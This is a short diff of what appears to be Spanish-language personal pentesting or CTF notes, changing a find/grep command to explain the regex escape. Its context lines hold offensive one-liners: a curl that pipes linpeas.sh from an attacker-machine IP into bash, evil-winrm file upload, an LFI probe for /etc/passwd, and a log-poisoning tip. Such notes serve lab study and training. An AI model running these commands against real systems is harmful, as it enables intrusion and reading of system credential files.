@@ -11,7 +11,7 @@ CURL es lo mismo que WGET ej: curl 10.10.14.4/linpeas.sh | bash , descarga y eje
 En evilwinrm para descargar un archivo directamente desde mi ordenador UPLOAD rutaarchivo/nombrearchivo
 Siempre que ponga file= probar con ../../../../../../etc/passwd (LFI)
 Si se junta LFI y PHP mira a ver si puedes hacer log poison
-find / 2>/dev/null | grep .txt$
+find / 2>/dev/null | grep \.txt$  ---> \. -> termina en txt,,  $ -> fin de linea, no hay nada detras del txt
 
 ```
 ### WINDOWS
